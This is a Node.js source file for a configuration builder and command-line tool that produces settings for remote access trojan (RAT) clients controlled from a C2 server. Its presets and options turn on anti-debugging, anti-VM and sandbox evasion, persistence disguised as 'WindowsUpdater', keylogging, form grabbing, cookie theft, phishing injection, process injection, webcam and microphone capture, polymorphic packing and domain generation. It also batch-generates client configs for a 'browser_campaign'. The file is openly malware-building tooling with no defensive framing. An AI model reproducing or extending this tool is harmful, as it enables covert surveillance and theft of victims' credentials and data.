// Configuration Builder for RAT Clients
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class ConfigBuilder {
  constructor() {
    this.configs = new Map();
    this.templates = ['basic', 'stealth', 'browser'];
  }

  // Generate secure random token
  generateToken(length = 32) {
    return crypto.randomBytes(length).toString('hex');
  }

  // Generate client ID
  generateClientId(prefix = 'rat') {
    const timestamp = Date.now().toString(36);
    const random = crypto.randomBytes(4).toString('hex');
    return `${prefix}_${timestamp}_${random}`;
  }

  // Create basic configuration
  createBasicConfig(options = {}) {
    return {
      serverUrl: options.serverUrl || 'https://your-c2-server.netlify.app',
      authToken: options.authToken || this.generateToken(),
      clientId: options.clientId || this.generateClientId(),
      template: options.template || 'basic',
      obfuscate: options.obfuscate !== false,
      persistence: options.persistence || false,
      heartbeatInterval: options.heartbeatInterval || 5000,
      maxRetries: options.maxRetries || 3,
      retryDelay: options.retryDelay || 10000,
      buildTime: new Date().toISOString(),
      metadata: {
        version: '1.0.0',
        builder: 'RatBuilder v1.0',
        platform: options.platform || 'all'
      }
    };
  }

  // Create stealth configuration
  createStealthConfig(options = {}) {
    const config = this.createBasicConfig({
      ...options,
      template: 'stealth',
      heartbeatInterval: options.heartbeatInterval || 30000,
      maxRetries: options.maxRetries || 5,
      retryDelay: options.retryDelay || 60000
    });

    config.stealth = {
      antiDebug: options.antiDebug !== false,
      antiVM: options.antiVM !== false,
      antiSandbox: options.antiSandbox !== false,
      encryptedCommunication: options.encryptedCommunication !== false,
      randomDelays: options.randomDelays !== false,
      userAgents: options.userAgents || [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
      ]
    };

    config.persistence = {
      enabled: options.persistence !== false,
      methods: options.persistenceMethods || ['registry', 'startup'],
      serviceName: options.serviceName || 'WindowsUpdater',
      hideFile: options.hideFile !== false
    };

    return config;
  }

  // Create browser configuration
  createBrowserConfig(options = {}) {
    const config = this.createBasicConfig({
      ...options,
      template: 'browser',
      heartbeatInterval: options.heartbeatInterval || 10000,
      maxRetries: options.maxRetries || 3,
      retryDelay: options.retryDelay || 15000
    });

    config.browser = {
      captureScreenshots: options.captureScreenshots !== false,
      keylogger: options.keylogger || false,
      formGrabber: options.formGrabber !== false,
      cookieExtractor: options.cookieExtractor !== false,
      domManipulation: options.domManipulation !== false,
      phishing: options.phishing || false,
      stealthMode: options.stealthMode || false
    };

    config.injection = {
      methods: options.injectionMethods || ['script', 'iframe'],
      targets: options.targets || ['all'],
      persistence: options.browserPersistence || 'session'
    };

    return config;
  }

  // Create advanced configuration
  createAdvancedConfig(options = {}) {
    const config = this.createStealthConfig(options);

    config.advanced = {
      fileOperations: options.fileOperations || false,
      shellCommands: options.shellCommands || false,
      processInjection: options.processInjection || false,
      networkSniffing: options.networkSniffing || false,
      clipboardAccess: options.clipboardAccess || false,
      webcamAccess: options.webcamAccess || false,
      microphoneAccess: options.microphoneAccess || false
    };

    config.evasion = {
      polymorphic: options.polymorphic || false,
      metamorphic: options.metamorphic || false,
      packing: options.packing || false,
      antiAnalysis: options.antiAnalysis !== false,
      domainGeneration: options.domainGeneration || false
    };

    return config;
  }

  // Validate configuration
  validateConfig(config) {
    const errors = [];

    if (!config.serverUrl) {
      errors.push('serverUrl is required');
    }

    if (!config.authToken || config.authToken.length < 16) {
      errors.push('authToken must be at least 16 characters');
    }

    if (!config.clientId) {
      errors.push('clientId is required');
    }

    if (!this.templates.includes(config.template)) {
      errors.push(`Invalid template: ${config.template}`);
    }

    if (config.heartbeatInterval && (config.heartbeatInterval < 1000 || config.heartbeatInterval > 300000)) {
      errors.push('heartbeatInterval must be between 1000 and 300000ms');
    }

    return {
      valid: errors.length === 0,
      errors: errors
    };
  }

  // Save configuration to file
  saveConfig(config, filename) {
    const validation = this.validateConfig(config);
    if (!validation.valid) {
      throw new Error(`Invalid configuration: ${validation.errors.join(', ')}`);
    }

    const filePath = path.join(__dirname, 'configs', filename);
    const dir = path.dirname(filePath);
    
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }

    fs.writeFileSync(filePath, JSON.stringify(config, null, 2));
    return filePath;
  }

  // Load configuration from file
  loadConfig(filename) {
    const filePath = path.join(__dirname, 'configs', filename);
    
    if (!fs.existsSync(filePath)) {
      throw new Error(`Configuration file not found: ${filename}`);
    }

    const config = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const validation = this.validateConfig(config);
    
    if (!validation.valid) {
      throw new Error(`Invalid configuration: ${validation.errors.join(', ')}`);
    }

    return config;
  }

  // Generate batch configurations
  generateBatchConfig(options = {}) {
    const {
      count = 10,
      template = 'basic',
      serverUrl,
      authToken,
      baseConfig = {}
    } = options;

    const configs = [];

    for (let i = 0; i < count; i++) {
      const configOptions = {
        ...baseConfig,
        template,
        serverUrl,
        authToken,
        clientId: this.generateClientId(template)
      };

      let config;
      switch (template) {
        case 'stealth':
          config = this.createStealthConfig(configOptions);
          break;
        case 'browser':
          config = this.createBrowserConfig(configOptions);
          break;
        default:
          config = this.createBasicConfig(configOptions);
      }

      configs.push(config);
    }

    return configs;
  }

  // Export configuration for builder
  exportForBuilder(config) {
    return {
      serverUrl: config.serverUrl,
      authToken: config.authToken,
      clientId: config.clientId,
      template: config.template,
      obfuscate: config.obfuscate,
      persistence: config.persistence,
      name: `${config.template}_${config.clientId}`,
      ...config.metadata
    };
  }

  // Create configuration presets
  createPreset(presetName, options = {}) {
    const presets = {
      'basic_test': () => this.createBasicConfig({
        serverUrl: 'http://localhost:8888',
        authToken: 'test-token-123',
        obfuscate: false,
        persistence: false
      }),

      'stealth_production': () => this.createStealthConfig({
        serverUrl: options.serverUrl,
        authToken: options.authToken,
        antiDebug: true,
        antiVM: true,
        antiSandbox: true,
        encryptedCommunication: true,
        persistence: true
      }),

      'browser_campaign': () => this.createBrowserConfig({
        serverUrl: options.serverUrl,
        authToken: options.authToken,
        captureScreenshots: true,
        keylogger: true,
        formGrabber: true,
        cookieExtractor: true,
        phishing: true
      }),

      'advanced_pentest': () => this.createAdvancedConfig({
        serverUrl: options.serverUrl,
        authToken: options.authToken,
        fileOperations: true,
        shellCommands: true,
        processInjection: true,
        networkSniffing: true,
        antiAnalysis: true
      })
    };

    if (!presets[presetName]) {
      throw new Error(`Unknown preset: ${presetName}`);
    }

    return presets[presetName]();
  }

  // List available presets
  listPresets() {
    return [
      'basic_test',
      'stealth_production',
      'browser_campaign',
      'advanced_pentest'
    ];
  }
}

// CLI interface
if (require.main === module) {
  const configBuilder = new ConfigBuilder();
  const args = process.argv.slice(2);
  const command = args[0];

  switch (command) {
    case 'create':
      const type = args[1] || 'basic';
      const options = {};

      // Parse options
      for (let i = 2; i < args.length; i++) {
        const arg = args[i];
        if (arg.startsWith('--')) {
          const [key, value] = arg.substring(2).split('=');
          if (value) {
            options[key] = value;
          } else {
            options[key] = true;
          }
        }
      }

      try {
        let config;
        switch (type) {
          case 'stealth':
            config = configBuilder.createStealthConfig(options);
            break;
          case 'browser':
            config = configBuilder.createBrowserConfig(options);
            break;
          case 'advanced':
            config = configBuilder.createAdvancedConfig(options);
            break;
          default:
            config = configBuilder.createBasicConfig(options);
        }

        const filename = args.find(arg => arg.startsWith('--output='))?.split('=')[1] || `${type}_config.json`;
        const filePath = configBuilder.saveConfig(config, filename);
        
        console.log(`✅ Configuration saved: ${filePath}`);
        console.log(`🆔 Client ID: ${config.clientId}`);
        console.log(`🔑 Auth Token: ${config.authToken}`);
      } catch (error) {
        console.error('❌ Failed to create configuration:', error.message);
        process.exit(1);
      }
      break;

    case 'preset':
      const presetName = args[1];
      const presetOptions = {};

      // Parse preset options
      for (let i = 2; i < args.length; i++) {
        const arg = args[i];
        if (arg.startsWith('--')) {
          const [key, value] = arg.substring(2).split('=');
          if (value) {
            presetOptions[key] = value;
          }
        }
      }

      try {
        const config = configBuilder.createPreset(presetName, presetOptions);
        const filename = args.find(arg => arg.startsWith('--output='))?.split('=')[1] || `${presetName}_config.json`;
        const filePath = configBuilder.saveConfig(config, filename);
        
        console.log(`✅ Preset configuration saved: ${filePath}`);
        console.log(`🆔 Client ID: ${config.clientId}`);
      } catch (error) {
        console.error('❌ Failed to create preset:', error.message);
        process.exit(1);
      }
      break;

    case 'batch':
      const count = parseInt(args[1]) || 10;
      const batchOptions = {};

      // Parse batch options
      for (let i = 2; i < args.length; i++) {
        const arg = args[i];
        if (arg.startsWith('--')) {
          const [key, value] = arg.substring(2).split('=');
          if (value) {
            batchOptions[key] = value;
          }
        }
      }

      try {
        const configs = configBuilder.generateBatchConfig({ count, ...batchOptions });
        const filename = args.find(arg => arg.startsWith('--output='))?.split('=')[1] || 'batch_configs.json';
        const filePath = configBuilder.saveConfig(configs, filename);
        
        console.log(`✅ Batch configurations saved: ${filePath}`);
        console.log(`📊 Generated ${configs.length} configurations`);
      } catch (error) {
        console.error('❌ Failed to generate batch:', error.message);
        process.exit(1);
      }
      break;

    case 'presets':
      console.log('Available presets:');
      configBuilder.listPresets().forEach(preset => {
        console.log(`  - ${preset}`);
      });
      break;

    default:
      console.log(`
Config Builder - Command Line Interface

Usage:
  node config-builder.js create <type> [options]
  node config-builder.js preset <name> [options]
  node config-builder.js batch <count> [options]
  node config-builder.js presets

Types:
  basic     - Basic RAT client
  stealth   - Stealth RAT client
  browser   - Browser-based RAT client
  advanced  - Advanced RAT client

Presets:
  basic_test         - Basic test configuration
  stealth_production - Production stealth configuration
  browser_campaign   - Browser campaign configuration
  advanced_pentest   - Advanced penetration testing

Options:
  --serverUrl=<url>      C2 server URL
  --authToken=<token>    Authentication token
  --output=<filename>    Output filename
  --obfuscate=true/false Enable obfuscation
  --persistence=true/false Enable persistence

Examples:
  node config-builder.js create stealth --serverUrl=https://c2.example.com --output=stealth.json
  node config-builder.js preset stealth_production --serverUrl=https://c2.example.com --authToken=token123
  node config-builder.js batch 50 --template=basic --serverUrl=https://c2.example.com
      `);
  }
}

module.exports = ConfigBuilder;
